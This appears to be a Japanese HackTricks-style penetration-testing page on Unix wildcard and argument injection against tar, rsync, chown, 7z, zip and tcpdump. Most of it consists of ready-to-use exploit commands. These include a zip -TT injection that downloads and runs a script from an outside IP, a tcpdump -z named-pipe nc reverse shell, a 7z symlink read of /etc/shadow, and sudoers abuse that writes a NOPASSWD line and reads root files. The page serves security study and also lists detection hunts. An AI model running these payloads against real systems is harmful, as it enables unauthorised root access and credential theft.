# Wildcards の応用テクニック

{{#include ../../banners/hacktricks-training.md}}

> Wildcard（別名 *glob*）の **argument injection** は、特権スクリプトが `tar`、`chown`、`rsync`、`zip`、`7z` などの Unix バイナリを、`*` のような引用符で囲まれていない wildcard とともに実行すると発生します。
> shell はバイナリを実行する **前に** wildcard を展開するため、作業ディレクトリ内にファイルを作成できる attacker は、`-` で始まるファイル名を作成できます。これにより、それらは **データではなく options** として解釈され、任意の flags や、さらには commands までも効果的に紛れ込ませることができます。<sup>[[6]](#references)</sup>
> このページでは、最も有用な primitives、最近の research、および 2023-2025 年の modern detections をまとめています。

## chown / chmod

wildcard によって option のようなファイル名が展開される際に `--reference` flag を悪用すると、**reference file の owner/group または permission bits をコピー**できます。<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
root が後で次のようなコマンドを実行すると:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
展開された `--reference=.drf.php` が明示的に指定された owner/mode を上書きし、一致するファイルが `.drf.php` の metadata を継承します（上記の設定では、攻撃者が書き込み可能な状態になります）。<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn)（combined attack）。<sup>[[7]](#references)</sup>
詳細については、classic DefenseCode paper も参照してください。<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

GNU tar の **checkpoint** feature と checkpoint actions を悪用して、任意の commands を実行します。<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
root が `tar -czf /root/backup.tgz *` などを実行すると、`shell.sh` が root として実行されます。<sup>[[10]](#references)</sup>

### bsdtar / macOS compressor override に関する注意点

最近の macOS のデフォルトの `tar`（`libarchive` ベース）は、GNU tar の `--checkpoint` インターフェースを提供していません。ただし、bsdtar では外部 compressor を選択するための **--use-compress-program** がドキュメント化されています。<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
特権スクリプトが `tar -cf backup.tar *` を実行すると、これは被害者の `PATH` を通じて `sh` を選択し、bsdtar はそれを compressor として起動します。<sup>[[11]](#references)</sup> これは option injection の証明になりますが、それだけでは信頼性のある arbitrary-command primitive にはなりません。wildcard によって作成されるファイル名には `/` を含めることができず、bsdtar は攻撃者が選択した shell command ではなく archive data を渡すためです。Code execution には、`PATH` を通じて解決される制御可能な executable、または有用な program を指定できる別の argument channel がさらに必要です。

---

## rsync

`rsync` では、`-e` や `--rsync-path` などの command-line flags によって remote shell または remote binary を上書きできます。<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
root が後で `rsync -az * backup:/srv/` を使ってディレクトリを archive すると、注入した flag によって remote-shell mechanism 経由で shell を実行できます。<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn)（`rsync` mode）。

---

## 7-Zip / 7z / 7za

特権スクリプトが wildcard の先頭に `--` を付けて option parsing を防いでいる場合でも、7-Zip CLI はファイル名の先頭に `@` を付けることで **file list files** を受け付けます。これを symlink と組み合わせると、*任意のファイルを exfiltrate できます*。<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
root が次のようなものを実行すると:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip は `root.txt`（→ `/etc/shadow`）をファイルリストとして読み込もうとし、処理を中止して、**内容を stderr に出力します**。<sup>[[13]](#references)</sup>

これは `-- *` を使用した場合でも機能します。7-Zip CLI は通常のファイル名と `@listfiles` の両方を位置引数として明示的に受け付けるため、`@root.txt` のようなリテラルなファイル名も特殊なものとして扱われます。<sup>[[13]](#references)</sup>

---

## zip

アプリケーションが user-controlled filenames を `zip` に渡す場合（wildcard 経由、または `--` なしで名前を列挙する場合）、非常に実用的な primitive が 2 つ存在します。<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` は「test archive」を有効にし、`-TT <cmd>` は tester を任意のプログラムに置き換えます（long form: `--unzip-command <cmd>`）。`-` で始まるファイル名を inject できる場合は、short-options parsing が機能するように、flags を別々のファイル名に分割します。<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
ノート
- `'-T -TT <cmd>'` のような単一のファイル名を試さないでください — short options は文字ごとに解析されるため、失敗します。示されているように、別々のトークンを使用してください。<sup>[[3]](#references)</sup>
- app によってファイル名からスラッシュが削除される場合は、bare host/IP から取得し（デフォルトのパスは `/index.html`）、`-O` でローカルに保存してから実行してください。<sup>[[3]](#references)</sup>
- `-sc`（処理済みの argv を表示）または `-h2`（より詳しい help）を使用して parsing を debug し、トークンがどのように消費されるかを確認できます。<sup>[[3]](#references)</sup>

Example（zip 3.0 での local behavior）。<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Web layer が `zip` の stdout/stderr を返す場合（単純な wrapper でよく見られる）、`--help` のような注入された flags や不正な options によるエラーが HTTP response に現れ、command-line injection を確認し、payload の調整に役立ちます。<sup>[[3]](#references)</sup>

---

## 追加の option-injection 候補

privileged wrapper が wildcard を使って writable directory を展開する場合、これらの文書化された option hooks を確認する価値があります。<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | shell に command string を渡す |
| `git`   | `-c core.sshCommand=<cmd>` | Git fetch/push で SSH の代わりに `<cmd>` を使用する |
| `scp`   | `-S <program>` | 代替の SSH-compatible connection program を使用する |

これらの primitives は、従来の *tar/rsync/zip* classics 以外を確認する場合にも役立ちます。

---

## 脆弱な wrapper と job の探索

最近の case studies と detection guidance が示すように、wildcard/argv injection はもはや **cron + tar** だけの問題ではありません。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> 同じ bug class は、次のような場所にも繰り返し現れています。

- attacker-controlled upload directories から「すべてを zip/tar として download」する web features
- attacker-controlled filename/filter fields を持つ **tcpdump** wrapper を公開する vendor/appliance debug shells
- writable directories 上で `tar`、`rsync`、`7z`、`zip`、`chown`、または `chmod` を呼び出す backup または rotation jobs

Useful triage commands（`pspy` invocation は、文書化された process/file-event および interval flags を使用します）。<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Quick heuristics:

- `-- *` は多くの GNU tools に対する有効な fix ですが、`@listfiles` は別途 parse されるため、`7z`/`7za` には **適用できません**。<sup>[[13]](#references)</sup>
- `zip` では、user-controlled な filenames を直接 enumerate する wrappers を探してください。short-option splitting（`-T` + `-TT <cmd>`）は、shell glob がなくても機能します。<sup>[[2]](#references)[[3]](#references)</sup>
- `tcpdump` では、**output file names**、**rotation settings**、または **capture-file replay** arguments を control できる wrappers に特に注意してください。<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): wrappers における argv injection による RCE

restricted shell または vendor wrapper が、user-controlled fields（例: `"file name"` parameter）を strict な quoting/validation なしで連結して `tcpdump` command line を構築する場合、追加の `tcpdump` flags を smuggle できます。`-G`（time-based rotation）、`-W`（files の number を制限）、`-z <cmd>`（post-rotate command）の組み合わせにより、tcpdump を実行している user（appliances では多くの場合 root）として arbitrary command execution が可能になります。<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Preconditions:

- `tcpdump` に渡される `argv` に影響を与えられること（例: `/debug/tcpdump --filter=... --file-name=<HERE>` のような wrapper 経由）。<sup>[[4]](#references)[[18]](#references)</sup>
- wrapper が file name field 内の spaces や `-` で始まる tokens を sanitize しないこと。<sup>[[4]](#references)</sup>

Classic PoC（writable path から reverse shell script を実行します）。<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
詳細：

- `-G 1` は毎秒 rotate し、`-W 1` は rotate されたファイルが 1 つ生成された時点で停止します。rotate が発生する前に、capture は一致する packet を受信する必要があります。<sup>[[18]](#references)</sup>
- `-z <cmd>` は rotate ごとに 1 回 post-rotate command を実行し、閉じられた savefile の path を引数として渡します。script/interpreter の引数処理が payload と一致することを確認してください。<sup>[[18]](#references)</sup>

removable media を使用しない variant：

- ファイルを書き込む別の primitive（例：output redirection を許可する別の command wrapper）がある場合は、script を既知の path に配置し、`-z /path/script.sh` を trigger します。必要に応じて、script 自身で `/bin/sh` を invoke してください。<sup>[[18]](#references)</sup>
- vendor wrapper で rotate された path を選択できる場合は、post-rotate command が savefile の引数を解釈する場合との組み合わせに限って、その path control を audit してください。path control だけでは、ファイルの contents は execute されません。<sup>[[18]](#references)</sup>

---

## sudoers: ワイルドカード/追加 args を使用する tcpdump → arbitrary write/read と root

sudoers の anti-pattern の例：<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
このルールでは、tcpdump の documented parser で利用可能な複数の options が残されています。<sup>[[3]](#references)[[18]](#references)</sup>
- `*` glob と permissive patterns は、最初の `-w` argument のみを制限します。`tcpdump` は複数の `-w` options を受け付け、最後のものが優先されます。<sup>[[3]](#references)[[18]](#references)</sup>
- このルールでは他の options が制限されていないため、`-Z`、`-r`、`-V` などが許可されます。<sup>[[3]](#references)[[18]](#references)</sup>

関連する primitives を以下に示します。<sup>[[3]](#references)[[18]](#references)</sup>
- 2 つ目の `-w` で destination path を上書きします（最初のものは sudoers を満たすためだけに使用）。<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- 制限されたツリーから脱出するための、最初の `-w` 内での Path Traversal。<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-Z root` で出力の所有権を強制する（どこにでも root 所有のファイルを作成する）。<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- `-r` を介して細工した PCAP を再生することによる任意内容の書き込み（例：sudoers の行を追加する）。<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>正確な ASCII payload を含む PCAP を作成し、root として書き込む</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- `-V <file>` による任意ファイルの読み取り/secret leak（savefiles のリストとして解釈される）。エラー診断で行がそのままエコーされることが多く、内容が leak する可能性がある。<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - 完全なExploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Wildcard InjectionによるShellの可能性を検出](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown`の呼び出し](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod`の呼び出し](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tarのcheckpoint](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1)マニュアル](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1)マニュアル](https://download.samba.org/pub/rsync/rsync.1)
- [13] [7-Zipコマンドライン構文](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1)マニュアル](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Git設定ドキュメント](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp`マニュアル](https://man.openbsd.org/scp)
- [18] [tcpdump(8)マニュアル](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
